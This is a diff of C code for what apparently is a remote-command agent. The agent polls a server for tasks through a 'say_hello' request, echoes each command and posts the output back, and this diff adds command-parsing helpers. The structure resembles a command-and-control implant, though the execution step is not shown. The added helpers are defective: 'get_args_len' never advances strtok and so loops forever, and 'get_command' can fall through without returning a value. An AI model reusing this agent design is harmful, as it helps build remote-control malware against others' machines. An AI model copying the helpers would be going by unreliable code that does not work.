@@ -26,28 +26,27 @@ int IDLE_TIME;
 int INTERVAL;
 long TIME_LAST_ACTIVE;
 
-size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
-    size_t index = data->size;
-    size_t n = (size * nmemb);
-    char* tmp;
-    data->size += (size * nmemb);
-    fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
-    tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
-    if(tmp){
-        data->data = tmp;
-    }
-    else
+/* ----------------------------------------------------------------------- *
+*  Utility
+* ------------------------------------------------------------------------ */
+char* get_command(char* todo)
+{
+    char *token = strtok(todo, " ");
+    while (token != NULL)
     {
-        if(data->data)
-        {
-            free(data->data);
-        }
-        fprintf(stderr, "Failed to allocate memory.\n");
-        return 0;
+				return token;
     }
-    memcpy((data->data + index), ptr, n);
-    data->data[data->size] = '\0';
-    return size * nmemb;
+}
+
+int get_args_len(char* todo)
+{
+    char *token = strtok(todo, " ");
+		int count = 0;
+    while (token != NULL)
+    {
+				count++;
+    }
+		return count - 1;
 }
 
 void succeeded_request()
@@ -86,6 +85,41 @@ char* get_unique_id()
         fclose(f);
         return UID;
     }
+}
+
+long get_time()
+{
+    time_t current_time;
+    time(&current_time);
+    return current_time;
+}
+
+
+/* ----------------------------------------------------------------------- *
+*  Request Wrapper
+* ------------------------------------------------------------------------ */
+size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
+    size_t index = data->size;
+    size_t n = (size * nmemb);
+    char* tmp;
+    data->size += (size * nmemb);
+    fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
+    tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
+    if(tmp){
+        data->data = tmp;
+    }
+    else
+    {
+        if(data->data)
+        {
+            free(data->data);
+        }
+        fprintf(stderr, "Failed to allocate memory.\n");
+        return 0;
+    }
+    memcpy((data->data + index), ptr, n);
+    data->data[data->size] = '\0';
+    return size * nmemb;
 }
 
 char* get_request(char *path)
@@ -153,6 +187,9 @@ char* post_request(char *path, char *post_data, bool json)
     return data.data;
 }
 
+/* ----------------------------------------------------------------------- *
+*  Action Threads
+* ------------------------------------------------------------------------ */
 char* send_output(char* output, bool newlines)
 {
     if(output!= NULL && output[0] == '\0') return "";
@@ -177,13 +214,9 @@ char* say_hello()
     return post_request(path, post_data, true);
 }
 
-long get_time()
-{
-    time_t current_time;
-    time(&current_time);
-    return current_time;
-}
-
+/* ----------------------------------------------------------------------- *
+*  Main Function
+* ------------------------------------------------------------------------ */
 void setup()
 {
     UID = malloc(BUFFER_SIZE);
@@ -215,13 +248,16 @@ void run()
     char *todo = malloc(BUFFER_SIZE);
     char *output = malloc(BUFFER_SIZE);
     while(1){
-        todo = say_hello(); //TODO: handle error
+        todo = say_hello();
         if(!(todo!= NULL && todo[0] == '\0'))
         {
             IDLE = false;
             TIME_LAST_ACTIVE = get_time();
             sprintf(output,"$ %s",todo);
             send_output(output, true);
+            char *command = get_command(todo);
+            int args_len = get_args_len(todo);
+
         }
         else
         {
